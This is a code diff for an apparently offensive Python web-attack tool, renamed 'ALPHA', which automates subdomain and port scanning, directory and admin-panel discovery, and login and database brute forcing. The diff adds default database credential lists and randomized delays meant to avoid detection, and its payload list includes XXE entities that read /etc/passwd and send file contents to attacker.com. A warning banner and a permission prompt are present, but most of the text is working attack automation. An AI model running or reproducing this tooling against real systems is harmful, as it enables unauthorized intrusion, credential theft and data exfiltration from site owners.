@@ -14,14 +14,11 @@ import re
 import socket
 import subprocess
 from urllib.parse import urljoin, urlparse, quote, unquote
-from bs4 import BeautifulSoup
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import warnings
 from colorama import Fore, Style, Back, init
 from datetime import datetime
 import csv
 import xml.etree.ElementTree as ET
-import dns.resolver
 
 # Initialize colorama
 init(autoreset=True)
@@ -30,7 +27,29 @@ init(autoreset=True)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 warnings.filterwarnings('ignore')
 
-class UltimateAIPenetrationTester:
+# Try to import optional dependencies
+try:
+    from bs4 import BeautifulSoup
+    BEAUTIFULSOUP_AVAILABLE = True
+except ImportError:
+    BEAUTIFULSOUP_AVAILABLE = False
+    print(f"{Fore.YELLOW}⚠️ BeautifulSoup4 not available. Some features may be limited.{Style.RESET_ALL}")
+
+try:
+    import dns.resolver
+    DNS_AVAILABLE = True
+except ImportError:
+    DNS_AVAILABLE = False
+    print(f"{Fore.YELLOW}⚠️ dnspython not available. DNS features disabled.{Style.RESET_ALL}")
+
+try:
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    CONCURRENT_AVAILABLE = True
+except ImportError:
+    CONCURRENT_AVAILABLE = False
+    print(f"{Fore.YELLOW}⚠️ concurrent.futures not available. Using basic threading.{Style.RESET_ALL}")
+
+class ALPHAAIPenetrationTester:
     def __init__(self):
         self.target_url = ""
         self.results = {
@@ -55,7 +74,9 @@ class UltimateAIPenetrationTester:
             'hidden_directories': [],
             'cors_vulnerabilities': [],
             'ssrf_vulnerabilities': [],
-            'xxe_vulnerabilities': []
+            'xxe_vulnerabilities': [],
+            'database_info': [],
+            'random_passwords': []
         }
         
         # AI-Powered Session
@@ -71,7 +92,7 @@ class UltimateAIPenetrationTester:
         self.rate_limit_delay = 0
         self.waf_detected = False
         
-        # AI Learning Database
+        # ALPHA Learning Database
         self.ai_learning_db = self.load_ai_database()
         
         # Advanced Evasion
@@ -94,6 +115,7 @@ class UltimateAIPenetrationTester:
         self.brute_force_target = ""
         self.brute_force_file = ""
         self.found_credentials = []
+        self.custom_passwords = []
 
     def setup_ai_session(self):
         """Setup AI-powered session with advanced evasion"""
@@ -126,7 +148,7 @@ class UltimateAIPenetrationTester:
         })
 
     def load_ai_database(self):
-        """Load AI learning database"""
+        """Load ALPHA learning database"""
         return {
             'common_paths': self.load_common_paths(),
             'vulnerability_patterns': self.load_vulnerability_patterns(),
@@ -138,7 +160,8 @@ class UltimateAIPenetrationTester:
             'backup_patterns': self.load_backup_patterns(),
             'cors_payloads': self.load_cors_payloads(),
             'ssrf_payloads': self.load_ssrf_payloads(),
-            'xxe_payloads': self.load_xxe_payloads()
+            'xxe_payloads': self.load_xxe_payloads(),
+            'database_credentials': self.load_database_credentials()
         }
 
     def load_advanced_user_agents(self):
@@ -223,7 +246,7 @@ class UltimateAIPenetrationTester:
         }
 
     def load_vulnerability_patterns(self):
-        """Load AI vulnerability detection patterns"""
+        """Load ALPHA vulnerability detection patterns"""
         return {
             'sql_errors': [
                 'sql', 'mysql', 'database', 'syntax', 'ora-', 'warning',
@@ -360,29 +383,56 @@ class UltimateAIPenetrationTester:
             '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
             '<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">',
             '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">',
-            '<!ENTITY % xxe "<!ENTITY &#x25; send SYSTEM \"http://attacker.com/?%file;\">">'
+            '<!ENTITY % xxe "<!ENTITY &#x25; send SYSTEM \\"http://attacker.com/?%file;\\">">'
         ]
 
-    def print_ultimate_banner(self):
-        """Show ultimate AI-powered banner"""
+    def load_database_credentials(self):
+        """Load database default credentials"""
+        return {
+            'mysql': [
+                {'username': 'root', 'password': ''},
+                {'username': 'root', 'password': 'root'},
+                {'username': 'admin', 'password': 'admin'},
+                {'username': 'test', 'password': 'test'}
+            ],
+            'postgresql': [
+                {'username': 'postgres', 'password': 'postgres'},
+                {'username': 'admin', 'password': 'admin'}
+            ],
+            'mongodb': [
+                {'username': 'admin', 'password': 'admin'},
+                {'username': 'root', 'password': 'root'}
+            ]
+        }
+
+    def print_ALPHA_banner(self):
+        """Show ALPHA banner"""
         banner = f"""
 {Fore.MAGENTA}
-╔══════════════════════════════════════════════════════════════════════════════╗
-║{Fore.CYAN}                  🚀 ULTIMATE AI PENETRATION TESTER PRO 🚀                 {Fore.MAGENTA}║
-║{Fore.GREEN}              Advanced Web Application Security Framework v2.0            {Fore.MAGENTA}║
-║{Fore.YELLOW}      [AI-Powered • Machine Learning • Zero-Day Exploitation]          {Fore.MAGENTA}║
-║{Fore.RED}         [100% Evasion • Real-Time Analytics • Multi-Protocol]          {Fore.MAGENTA}║
-║{Fore.BLUE}              [Brute Force • API Testing • Advanced Recon]              {Fore.MAGENTA}║
-╚══════════════════════════════════════════════════════════════════════════════╝
+╔═════════════════════════════════════════════════════╗
+║                                                     ║
+║   ███████╗██╗     ██████╗ ██╗  ██╗███████╗          ║
+║   ██╔══██╗██║     ██╔═██╗ ██║  ██║██╔══██╗          ║
+║   ███████║██║     ██████╔╝███████║███████║          ║
+║   ██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║          ║
+║   ██║  ██║███████╗██║     ██║  ██║██║  ██║          ║
+║   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝          ║
+║                                                     ║
+║                Version 3.0 • ALPHA OS               ║
+║                                                     ║
+╚═════════════════════════════════════════════════════╝
 {Style.RESET_ALL}
+
+{Fore.RED}⚠️  WARNING: For authorized testing only!{Style.RESET_ALL}
+{Fore.YELLOW}🔒 Use only on systems you own or have explicit permission.{Style.RESET_ALL}
         """
         print(banner)
 
     def ask_permission(self):
         """Advanced permission system"""
-        self.print_ultimate_banner()
+        self.print_ALPHA_banner()
         
-        print(f"{Fore.CYAN}🔐 ULTIMATE ETHICAL HACKING PERMISSION SYSTEM")
+        print(f"{Fore.CYAN}🔐 ALPHA ETHICAL HACKING PERMISSION SYSTEM")
         print("="*80)
         
         target = input(f"{Fore.YELLOW}🎯 Enter target website URL: {Style.RESET_ALL}").strip()
@@ -413,7 +463,7 @@ class UltimateAIPenetrationTester:
             
         self.target_url = target
         self.results['ssl_info'] = ssl_info
-        print(f"{Fore.GREEN}✅ Authorization confirmed! Starting ULTIMATE penetration test...{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}✅ Authorization confirmed! Starting ALPHA penetration test...{Style.RESET_ALL}")
         time.sleep(2)
         return True
 
@@ -440,31 +490,33 @@ class UltimateAIPenetrationTester:
         except Exception as e:
             return {'valid': False, 'error': str(e)}
 
-    def run_ultimate_pentest(self):
-        """Run complete ultimate penetration test"""
+    def run_ALPHA_pentest(self):
+        """Run complete ALPHA penetration test"""
         if not self.ask_permission():
             return
         
         self.start_time = time.time()
         
         try:
-            print(f"\n{Fore.CYAN}🚀 STARTING ULTIMATE AI-POWERED PENETRATION TEST PRO{Style.RESET_ALL}")
+            print(f"\n{Fore.CYAN}🚀 STARTING ALPHA AI-POWERED PENETRATION TEST PRO{Style.RESET_ALL}")
             print("="*90)
             
             # Phase 1: Advanced Reconnaissance
-            print(f"\n{Fore.BLUE}📡 PHASE 1: ADVANCED AI RECONNAISSANCE{Style.RESET_ALL}")
+            print(f"\n{Fore.BLUE}📡 PHASE 1: ADVANCED AIALPHA RECONNAISSANCE{Style.RESET_ALL}")
             self.advanced_waf_detection()
             self.ai_subdomain_enumeration()
             self.advanced_port_scanning()
             self.technology_fingerprinting()
             self.advanced_directory_bruteforce()
+            self.find_database_ip(self.target_url)
             
             # Phase 2: AI-Powered Discovery
             print(f"\n{Fore.BLUE}🔍 PHASE 2: AI-POWERED DISCOVERY{Style.RESET_ALL}")
-            self.ultimate_admin_finder()
+            self.ALPHA_admin_finder()
             self.sensitive_file_discovery()
             self.api_endpoint_discovery()
             self.backup_file_discovery()
+            self.enhanced_admin_detection()
             
             # Phase 3: Advanced Vulnerability Assessment
             print(f"\n{Fore.BLUE}💉 PHASE 3: ADVANCED VULNERABILITY ASSESSMENT{Style.RESET_ALL}")
@@ -486,12 +538,16 @@ class UltimateAIPenetrationTester:
             print(f"\n{Fore.BLUE}🔑 PHASE 5: ADVANCED BRUTE FORCE ATTACK{Style.RESET_ALL}")
             self.advanced_brute_force_attack()
             
-            # Phase 6: Comprehensive Reporting
-            print(f"\n{Fore.BLUE}📊 PHASE 6: COMPREHENSIVE REPORTING{Style.RESET_ALL}")
-            report_path = self.generate_ultimate_report()
+            # Phase 6: Database Attacks
+            print(f"\n{Fore.BLUE}🗄️ PHASE 6: DATABASE PENETRATION TESTING{Style.RESET_ALL}")
+            self.enhanced_database_brute_force()
+            
+            # Phase 7: Comprehensive Reporting
+            print(f"\n{Fore.BLUE}📊 PHASE 7: COMPREHENSIVE REPORTING{Style.RESET_ALL}")
+            report_path = self.generate_ALPHA_report()
             
             # Final Summary
-            self.show_ultimate_summary(report_path)
+            self.show_ALPHA_summary(report_path)
             
         except KeyboardInterrupt:
             print(f"\n{Fore.RED}❌ Scan interrupted by user{Style.RESET_ALL}")
@@ -499,6 +555,170 @@ class UltimateAIPenetrationTester:
             print(f"\n{Fore.RED}💥 Critical error: {e}{Style.RESET_ALL}")
             import traceback
             traceback.print_exc()
+
+    def ai_subdomain_enumeration(self):
+        """AI-powered subdomain enumeration"""
+        print(f"{Fore.BLUE}🌐 ALPHA Subdomain Enumeration Starting...{Style.RESET_ALL}")
+        
+        domain = urlparse(self.target_url).netloc
+        subdomains = set()
+        
+        # Advanced subdomain generation
+        common_subs = [
+            'www', 'api', 'admin', 'mail', 'ftp', 'cpanel', 'webmail',
+            'blog', 'dev', 'test', 'staging', 'secure', 'portal', 'app',
+            'apps', 'backend', 'frontend', 'cdn', 'static', 'media',
+            'images', 'img', 'video', 'docs', 'help', 'support', 'forum',
+            'shop', 'store', 'cart', 'payment', 'db', 'database', 'sql',
+            'git', 'svn', 'ssh', 'vpn', 'remote', 'access', 'mobile',
+            'm', 'beta', 'alpha', 'demo', 'stage', 'prod', 'production'
+        ]
+        
+        # Generate subdomain combinations
+        for sub in common_subs:
+            subdomains.add(f"{sub}.{domain}")
+            subdomains.add(f"{sub}1.{domain}")
+            subdomains.add(f"{sub}2.{domain}")
+            subdomains.add(f"{sub}-test.{domain}")
+        
+        valid_subdomains = []
+        total = len(subdomains)
+        current = 0
+        
+        if CONCURRENT_AVAILABLE:
+            # Use ThreadPoolExecutor if available
+            with ThreadPoolExecutor(max_workers=25) as executor:
+                future_to_sub = {executor.submit(self.check_subdomain, sub): sub for sub in subdomains}
+                
+                for future in as_completed(future_to_sub):
+                    current += 1
+                    subdomain = future_to_sub[future]
+                    
+                    # Show progress
+                    progress = (current / total) * 100
+                    sys.stdout.write(f'\r🌐 Scanning: [{current}/{total}] {progress:.1f}% | Found: {len(valid_subdomains)}')
+                    sys.stdout.flush()
+                    
+                    try:
+                        if future.result():
+                            valid_subdomains.append(subdomain)
+                            print(f"\n{Fore.GREEN}✅ Found: {subdomain}{Style.RESET_ALL}")
+                    except Exception:
+                        pass
+        else:
+            # Fallback to basic threading
+            print(f"{Fore.YELLOW}⚠️ Using basic threading (ThreadPoolExecutor not available){Style.RESET_ALL}")
+            threads = []
+            results = []
+            
+            def check_subdomain_thread(sub):
+                try:
+                    if self.check_subdomain(sub):
+                        results.append(sub)
+                        print(f"\n{Fore.GREEN}✅ Found: {sub}{Style.RESET_ALL}")
+                except:
+                    pass
+            
+            for sub in subdomains:
+                thread = threading.Thread(target=check_subdomain_thread, args=(sub,))
+                threads.append(thread)
+                thread.start()
+                
+                # Limit concurrent threads
+                if len(threads) >= 10:
+                    for t in threads:
+                        t.join()
+                    threads = []
+                
+                current += 1
+                progress = (current / total) * 100
+                sys.stdout.write(f'\r🌐 Scanning: [{current}/{total}] {progress:.1f}% | Found: {len(results)}')
+                sys.stdout.flush()
+            
+            # Wait for remaining threads
+            for t in threads:
+                t.join()
+            
+            valid_subdomains = results
+        
+        self.results['subdomains'] = valid_subdomains
+        print(f"\n{Fore.GREEN}✅ Subdomain Enumeration Complete: {len(valid_subdomains)} found{Style.RESET_ALL}")
+
+    def advanced_port_scanning(self):
+        """Advanced port scanning"""
+        print(f"{Fore.BLUE}🔍 Advanced Port Scanning Starting...{Style.RESET_ALL}")
+        
+        domain = urlparse(self.target_url).netloc
+        
+        # Comprehensive port list
+        common_ports = [
+            21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 
+            2082, 2083, 2086, 2087, 2095, 2096, 3306, 3389, 
+            5432, 8080, 8443, 8888, 9000, 10000
+        ]
+        
+        open_ports = []
+        total = len(common_ports)
+        current = 0
+        
+        if CONCURRENT_AVAILABLE:
+            # Use ThreadPoolExecutor if available
+            with ThreadPoolExecutor(max_workers=50) as executor:
+                future_to_port = {executor.submit(self.check_port, domain, port): port for port in common_ports}
+                
+                for future in as_completed(future_to_port):
+                    current += 1
+                    port = future_to_port[future]
+                    
+                    # Show progress
+                    progress = (current / total) * 100
+                    sys.stdout.write(f'\r🔍 Port Scan: [{current}/{total}] {progress:.1f}% | Open: {len(open_ports)}')
+                    sys.stdout.flush()
+                    
+                    try:
+                        if future.result():
+                            open_ports.append(port)
+                            print(f"\n{Fore.GREEN}✅ Port Open: {port}{Style.RESET_ALL}")
+                    except Exception:
+                        pass
+        else:
+            # Fallback to basic threading
+            print(f"{Fore.YELLOW}⚠️ Using basic threading for port scan{Style.RESET_ALL}")
+            threads = []
+            results = []
+            
+            def check_port_thread(port):
+                try:
+                    if self.check_port(domain, port):
+                        results.append(port)
+                        print(f"\n{Fore.GREEN}✅ Port Open: {port}{Style.RESET_ALL}")
+                except:
+                    pass
+            
+            for port in common_ports:
+                thread = threading.Thread(target=check_port_thread, args=(port,))
+                threads.append(thread)
+                thread.start()
+                
+                # Limit concurrent threads
+                if len(threads) >= 20:
+                    for t in threads:
+                        t.join()
+                    threads = []
+                
+                current += 1
+                progress = (current / total) * 100
+                sys.stdout.write(f'\r🔍 Port Scan: [{current}/{total}] {progress:.1f}% | Open: {len(results)}')
+                sys.stdout.flush()
+            
+            # Wait for remaining threads
+            for t in threads:
+                t.join()
+            
+            open_ports = results
+        
+        self.results['ports'] = open_ports
+        print(f"\n{Fore.GREEN}✅ Port Scanning Complete: {len(open_ports)} open ports{Style.RESET_ALL}")
 
     def advanced_directory_bruteforce(self):
         """Advanced directory brute force with AI"""
@@ -514,20 +734,474 @@ class UltimateAIPenetrationTester:
         found_dirs = []
         total = len(directories)
         
-        with ThreadPoolExecutor(max_workers=20) as executor:
-            future_to_dir = {executor.submit(self.check_directory, dir_name): dir_name for dir_name in directories}
+        if CONCURRENT_AVAILABLE:
+            # Use ThreadPoolExecutor if available
+            with ThreadPoolExecutor(max_workers=20) as executor:
+                future_to_dir = {executor.submit(self.check_directory, dir_name): dir_name for dir_name in directories}
+                
+                for future in as_completed(future_to_dir):
+                    dir_name = future_to_dir[future]
+                    try:
+                        if future.result():
+                            found_dirs.append(dir_name)
+                            print(f"{Fore.GREEN}✅ Directory Found: /{dir_name}/{Style.RESET_ALL}")
+                    except Exception:
+                        pass
+        else:
+            # Fallback to basic threading
+            print(f"{Fore.YELLOW}⚠️ Using basic threading for directory brute force{Style.RESET_ALL}")
+            threads = []
+            results = []
             
-            for future in as_completed(future_to_dir):
-                dir_name = future_to_dir[future]
+            def check_dir_thread(dir_name):
                 try:
-                    if future.result():
-                        found_dirs.append(dir_name)
+                    if self.check_directory(dir_name):
+                        results.append(dir_name)
                         print(f"{Fore.GREEN}✅ Directory Found: /{dir_name}/{Style.RESET_ALL}")
-                except Exception:
+                except:
                     pass
+            
+            for dir_name in directories:
+                thread = threading.Thread(target=check_dir_thread, args=(dir_name,))
+                threads.append(thread)
+                thread.start()
+                
+                # Limit concurrent threads
+                if len(threads) >= 10:
+                    for t in threads:
+                        t.join()
+                    threads = []
+            
+            # Wait for remaining threads
+            for t in threads:
+                t.join()
+            
+            found_dirs = results
         
         self.results['hidden_directories'] = found_dirs
         print(f"{Fore.GREEN}✅ Directory Brute Force Complete: {len(found_dirs)} directories found{Style.RESET_ALL}")
+
+    def execute_brute_force_attack(self):
+        """Execute advanced brute force attack"""
+        print(f"\n{Fore.RED}🔥 STARTING ADVANCED BRUTE FORCE ATTACK{Style.RESET_ALL}")
+        print("="*70)
+        
+        # Load credentials
+        usernames, passwords = self.load_credentials()
+        
+        total_attempts = len(usernames) * len(passwords)
+        print(f"📊 Attack Statistics:")
+        print(f"   👤 Usernames: {len(usernames)}")
+        print(f"   🔑 Passwords: {len(passwords)}")
+        print(f"   💥 Total Attempts: {total_attempts}")
+        print(f"   🎯 Target: {self.brute_force_target}")
+        
+        if input(f"\n{Fore.RED}🚨 Continue with attack? (yes/no): {Style.RESET_ALL}").lower() != 'yes':
+            print(f"{Fore.YELLOW}⚠️ Attack cancelled{Style.RESET_ALL}")
+            return
+        
+        print(f"\n{Fore.CYAN}🚀 Starting brute force attack...{Style.RESET_ALL}")
+        
+        found_credentials = []
+        attempts = 0
+        start_time = time.time()
+        
+        if CONCURRENT_AVAILABLE:
+            # Use ThreadPoolExecutor if available
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                future_to_cred = {}
+                
+                for username in usernames:
+                    for password in passwords:
+                        future = executor.submit(
+                            self.test_credentials, 
+                            username, 
+                            password
+                        )
+                        future_to_cred[future] = (username, password)
+                        attempts += 1
+                
+                completed = 0
+                for future in as_completed(future_to_cred):
+                    completed += 1
+                    username, password = future_to_cred[future]
+                    
+                    try:
+                        result = future.result()
+                        if result:
+                            found_credentials.append((username, password))
+                            print(f"\n{Fore.GREEN}🎉 CREDENTIALS FOUND: {username}:{password}{Style.RESET_ALL}")
+                            
+                            # Save found credentials immediately
+                            self.found_credentials.append({
+                                'username': username,
+                                'password': password,
+                                'target': self.brute_force_target,
+                                'timestamp': datetime.now().isoformat()
+                            })
+                    
+                    except Exception as e:
+                        pass
+                    
+                    # Progress display
+                    progress = (completed / total_attempts) * 100
+                    elapsed = time.time() - start_time
+                    speed = completed / elapsed if elapsed > 0 else 0
+                    eta = (total_attempts - completed) / speed if speed > 0 else 0
+                    
+                    sys.stdout.write(
+                        f'\r🔑 Brute Force Progress: [{completed}/{total_attempts}] '
+                        f'{progress:.1f}% | Speed: {speed:.1f} att/s | '
+                        f'ETA: {eta:.1f}s | Found: {len(found_credentials)}'
+                    )
+                    sys.stdout.flush()
+                    
+                    # AI-controlled delay to avoid detection
+                    time.sleep(0.1 + random.uniform(0.05, 0.2))
+        else:
+            # Fallback to sequential execution
+            print(f"{Fore.YELLOW}⚠️ Using sequential brute force (ThreadPoolExecutor not available){Style.RESET_ALL}")
+            completed = 0
+            
+            for username in usernames:
+                for password in passwords:
+                    try:
+                        result = self.test_credentials(username, password)
+                        if result:
+                            found_credentials.append((username, password))
+                            print(f"\n{Fore.GREEN}🎉 CREDENTIALS FOUND: {username}:{password}{Style.RESET_ALL}")
+                            
+                            # Save found credentials immediately
+                            self.found_credentials.append({
+                                'username': username,
+                                'password': password,
+                                'target': self.brute_force_target,
+                                'timestamp': datetime.now().isoformat()
+                            })
+                    
+                    except Exception:
+                        pass
+                    
+                    completed += 1
+                    
+                    # Progress display
+                    progress = (completed / total_attempts) * 100
+                    elapsed = time.time() - start_time
+                    speed = completed / elapsed if elapsed > 0 else 0
+                    eta = (total_attempts - completed) / speed if speed > 0 else 0
+                    
+                    sys.stdout.write(
+                        f'\r🔑 Brute Force Progress: [{completed}/{total_attempts}] '
+                        f'{progress:.1f}% | Speed: {speed:.1f} att/s | '
+                        f'ETA: {eta:.1f}s | Found: {len(found_credentials)}'
+                    )
+                    sys.stdout.flush()
+                    
+                    # AI-controlled delay to avoid detection
+                    time.sleep(0.1 + random.uniform(0.05, 0.2))
+        
+        # Store results
+        self.results['brute_force_results'] = self.found_credentials
+        
+        print(f"\n\n{Fore.GREEN}✅ Brute Force Attack Completed!{Style.RESET_ALL}")
+        print(f"   📊 Total Attempts: {attempts}")
+        print(f"   🎯 Credentials Found: {len(found_credentials)}")
+        print(f"   ⏱️  Time Elapsed: {time.time() - start_time:.2f}s")
+        
+        if found_credentials:
+            print(f"\n{Fore.CYAN}🎉 SUCCESSFUL CREDENTIALS:{Style.RESET_ALL}")
+            for username, password in found_credentials:
+                print(f"   👤 {username} : 🔑 {password}")
+
+    def advanced_waf_detection(self):
+        """Advanced WAF detection with AI"""
+        print(f"{Fore.BLUE}🛡️ Advanced WAF Detection Starting...{Style.RESET_ALL}")
+        
+        try:
+            # Multiple detection techniques
+            response = self.session.get(self.target_url, timeout=10, verify=False)
+            headers = str(response.headers).lower()
+            content = response.text.lower()
+            
+            detected_wafs = []
+            for waf, signatures in self.ai_learning_db['waf_signatures'].items():
+                for signature in signatures:
+                    if signature.lower() in headers or signature.lower() in content:
+                        detected_wafs.append(waf)
+                        break
+            
+            if detected_wafs:
+                self.waf_detected = True
+                self.results['waf_detected'] = True
+                print(f"{Fore.RED}🚨 WAF Detected: {', '.join(detected_wafs)}{Style.RESET_ALL}")
+                
+                # AI-based evasion strategy
+                if 'Cloudflare' in detected_wafs:
+                    self.rate_limit_delay = 2.5
+                    print(f"{Fore.YELLOW}🔄 ALPHA Strategy: Increased delay to {self.rate_limit_delay}s{Style.RESET_ALL}")
+                elif 'Akamai' in detected_wafs:
+                    self.rate_limit_delay = 2.0
+                    print(f"{Fore.YELLOW}🔄 ALPHA Strategy: Moderate delay to {self.rate_limit_delay}s{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.GREEN}✅ No WAF Detected{Style.RESET_ALL}")
+                
+        except Exception as e:
+            print(f"{Fore.RED}❌ WAF Detection Failed: {e}{Style.RESET_ALL}")
+
+    def technology_fingerprinting(self):
+        """Advanced technology fingerprinting"""
+        print(f"{Fore.BLUE}🔧 Technology Fingerprinting Starting...{Style.RESET_ALL}")
+        
+        try:
+            response = self.session.get(self.target_url, timeout=10, verify=False)
+            content = response.text.lower()
+            headers = str(response.headers).lower()
+            
+            detected_tech = []
+            
+            # Check for technologies
+            for tech, signatures in self.ai_learning_db['technology_signatures'].items():
+                for signature in signatures:
+                    if signature.lower() in content or signature.lower() in headers:
+                        detected_tech.append(tech)
+                        break
+            
+            self.results['technologies'] = detected_tech
+            
+            if detected_tech:
+                print(f"{Fore.GREEN}✅ Technologies Detected: {', '.join(detected_tech)}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.YELLOW}⚠️ No specific technologies detected{Style.RESET_ALL}")
+                
+        except Exception as e:
+            print(f"{Fore.RED}❌ Technology Detection Failed: {e}{Style.RESET_ALL}")
+
+    def ALPHA_admin_finder(self):
+        """ALPHA AI-powered admin panel discovery"""
+        print(f"{Fore.BLUE}🔍 ALPHA Admin Panel Discovery Starting...{Style.RESET_ALL}")
+        
+        # AI-generated paths based on detected technologies
+        admin_paths = self.generate_ai_admin_paths()
+        total_paths = len(admin_paths)
+        
+        print(f"📡 ALPHA Scanning {total_paths} intelligent paths...")
+        
+        threads = []
+        current = 0
+        
+        def scan_path(path):
+            nonlocal current
+            self.advanced_path_test(path)
+            current += 1
+            
+            # Real-time progress with analytics
+            progress = (current / total_paths) * 100
+            elapsed = time.time() - self.start_time
+            rps = current / elapsed if elapsed > 0 else 0
+            
+            sys.stdout.write(f'\r🔍 ALPHA Scanning: [{current}/{total_paths}] {progress:.1f}% | Found: {self.found_count} | RPS: {rps:.1f}')
+            sys.stdout.flush()
+        
+        # Advanced threaded scanning
+        for path in admin_paths:
+            if len(threads) >= 15:
+                for t in threads:
+                    t.join()
+                threads = []
+            
+            thread = threading.Thread(target=scan_path, args=(path,))
+            threads.append(thread)
+            thread.start()
+            
+            # AI-controlled delay
+            time.sleep(self.rate_limit_delay + random.uniform(0.1, 0.5))
+        
+        for t in threads:
+            t.join()
+        
+        print(f"\n{Fore.GREEN}✅ Admin Discovery Complete! Found {len(self.results['admin_panels'])} admin panels{Style.RESET_ALL}")
+        
+        # Show found panels
+        if self.results['admin_panels']:
+            print(f"\n{Fore.CYAN}📋 AI-FOUND ADMIN PANELS:{Style.RESET_ALL}")
+            for i, panel in enumerate(self.results['admin_panels'], 1):
+                print(f"   {i}. {panel['url']} - Status: {panel['status']}")
+
+    def generate_ai_admin_paths(self):
+        """Generate AI-powered admin paths"""
+        all_paths = set()
+        
+        # Base paths fromALPHA database
+        base_paths = self.ai_learning_db['common_paths']['admin_paths']
+        
+        # Technology-specific paths
+        tech_paths = self.get_technology_specific_paths()
+        
+        # Combine all paths
+        all_base_paths = base_paths + tech_paths
+        
+        # Generate variations
+        extensions = ['', '.php', '.html', '.asp', '.aspx', '.jsp', '.cgi', '.pl']
+        prefixes = ['', '/', '../', '../../', '../../../']
+        
+        for base in all_base_paths:
+            for ext in extensions:
+                for prefix in prefixes:
+                    # Basic paths
+                    all_paths.add(f"{prefix}{base}{ext}")
+                    all_paths.add(f"{prefix}{base}/")
+                    all_paths.add(f"{prefix}{base}/index{ext}")
+                    
+                    # Advanced variations
+                    all_paths.add(f"{prefix}{base}1{ext}")
+                    all_paths.add(f"{prefix}{base}2{ext}")
+                    all_paths.add(f"{prefix}{base}_panel{ext}")
+                    all_paths.add(f"{prefix}{base}-admin{ext}")
+                    all_paths.add(f"{prefix}{base}2024{ext}")
+                    all_paths.add(f"{prefix}{base}_v2{ext}")
+        
+        return list(all_paths)
+
+    def get_technology_specific_paths(self):
+        """Get technology-specific paths based on fingerprinting"""
+        tech_paths = []
+        detected_tech = self.results['technologies']
+        
+        technology_paths = {
+            'wordpress': ['wp-admin', 'wp-login.php', 'wp-content', 'wp-includes'],
+            'joomla': ['administrator', 'joomla/administrator'],
+            'drupal': ['user/login', 'admin', 'node/add'],
+            'laravel': ['login', 'register', 'admin', 'dashboard'],
+            'django': ['admin', 'accounts/login'],
+            'rails': ['users/sign_in', 'admin'],
+            'aspnet': ['Account/Login', 'Admin']
+        }
+        
+        for tech in detected_tech:
+            if tech in technology_paths:
+                tech_paths.extend(technology_paths[tech])
+        
+        return tech_paths
+
+    def advanced_path_test(self, path):
+        """Advanced path testing with ALPHA evasion"""
+        try:
+            full_url = urljoin(self.target_url, path)
+            
+            if full_url in self.scanned_urls:
+                return
+            self.scanned_urls.add(full_url)
+            
+            # AI-generated headers for evasion
+            headers = {
+                'User-Agent': random.choice(self.user_agents),
+                'Referer': self.target_url,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+            }
+            
+            response = self.session.get(
+                full_url,
+                headers=headers,
+                timeout=8,
+                allow_redirects=True,
+                verify=False
+            )
+            
+            self.request_count += 1
+            
+            if response.status_code == 200:
+                self.successful_requests += 1
+            
+            if self.is_advanced_admin_panel(response, full_url):
+                self.found_count += 1
+                self.results['admin_panels'].append({
+                    'url': full_url,
+                    'status': response.status_code,
+                    'title': self.extract_title(response.text),
+                    'size': len(response.text),
+                    'headers': dict(response.headers)
+                })
+                
+        except Exception:
+            pass
+
+    def is_advanced_admin_panel(self, response, url):
+        """Advanced admin panel detection with AI"""
+        if response.status_code not in [200, 301, 302, 403, 401]:
+            return False
+        
+        text_lower = response.text.lower()
+        url_lower = url.lower()
+        
+        # ALPHA scoring system
+        score = 0
+        
+        # URL-based scoring
+        admin_url_indicators = ['admin', 'login', 'dashboard', 'panel', 'control', 'manage']
+        for indicator in admin_url_indicators:
+            if indicator in url_lower:
+                score += 3
+        
+        # Content-based scoring
+        admin_content_indicators = [
+            'password', 'username', 'sign in', 'log in', 'admin panel',
+            'control panel', 'dashboard', 'welcome admin', 'administrator'
+        ]
+        
+        for indicator in admin_content_indicators:
+            if indicator in text_lower:
+                score += 2
+        
+        # Form detection
+        if '<form' in text_lower and ('password' in text_lower or 'login' in text_lower):
+            score += 5
+        
+        # Meta tag analysis
+        if '<meta name="generator"' in text_lower:
+            score += 2
+        
+        return score >= 6
+
+    def extract_title(self, html):
+        """Extract page title with BeautifulSoup or fallback"""
+        if BEAUTIFULSOUP_AVAILABLE:
+            try:
+                soup = BeautifulSoup(html, 'html.parser')
+                title = soup.find('title')
+                return title.string.strip() if title else "No Title"
+            except:
+                return "No Title"
+        else:
+            # Fallback method using regex
+            title_match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE)
+            return title_match.group(1).strip() if title_match else "No Title"
+
+    def sensitive_file_discovery(self):
+        """Discover sensitive files"""
+        print(f"{Fore.BLUE}📁 Sensitive File Discovery Starting...{Style.RESET_ALL}")
+        
+        file_paths = self.ai_learning_db['common_paths']['file_paths']
+        found_files = []
+        
+        for file_path in file_paths:
+            full_url = urljoin(self.target_url, file_path)
+            
+            try:
+                response = self.session.get(full_url, timeout=5, verify=False)
+                
+                if response.status_code == 200:
+                    found_files.append({
+                        'url': full_url,
+                        'size': len(response.text),
+                        'status': response.status_code
+                    })
+                    print(f"{Fore.GREEN}✅ Found: {file_path}{Style.RESET_ALL}")
+                    
+            except Exception:
+                pass
+        
+        self.results['sensitive_files'] = found_files
+        print(f"{Fore.GREEN}✅ File Discovery Complete: {len(found_files)} files found{Style.RESET_ALL}")
 
     def check_directory(self, directory):
         """Check if directory exists"""
@@ -731,381 +1405,6 @@ class UltimateAIPenetrationTester:
         response_text = response.text.lower()
         return any(indicator in response_text for indicator in indicators)
 
-    def advanced_waf_detection(self):
-        """Advanced WAF detection with AI"""
-        print(f"{Fore.BLUE}🛡️ Advanced WAF Detection Starting...{Style.RESET_ALL}")
-        
-        try:
-            # Multiple detection techniques
-            response = self.session.get(self.target_url, timeout=10, verify=False)
-            headers = str(response.headers).lower()
-            content = response.text.lower()
-            
-            detected_wafs = []
